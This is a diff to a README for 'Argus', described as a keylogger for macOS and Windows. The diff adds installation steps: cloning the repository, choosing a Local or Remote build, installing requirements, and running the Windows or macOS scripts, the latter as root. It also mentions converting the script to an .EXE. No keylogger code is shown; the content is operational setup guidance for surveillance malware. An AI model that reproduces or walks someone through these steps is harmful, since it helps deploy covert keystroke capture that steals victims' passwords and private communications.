@@ -26,13 +26,23 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 
 # Installation on Windows
 
+**git clone https://github.com/ALDON94/argus.git**
+
+
+*cd Argus/Windows/bin/Local* **or** *cd Argus/Windows/bin/Remote*
+
 
 *pip3 install -r requirements.txt*
 
-> **python3 win-local.py**
+
+####run
+
+*python3 win-local.py* **or** *python3 win-remote.py* 
+
 
 
 **if you want to convert the script to .EXE There's two ways you can go for it**
+
 
 # First option using pyinstaller 
 
@@ -63,7 +73,14 @@ Keylogger With multiple Features Built For  **macOS and Windows**
 # Installation on macOS
 
 
+**git clone https://github.com/ALDON94/argus.git**
+
+
+*cd Argus/macos/bin/Local* **or** *cd Argus/macos/bin/Remote*
+
+
 *pip3 install -r requirements.txt*
+
 
 sudo python3 osx-local.py **run it as root!**
 
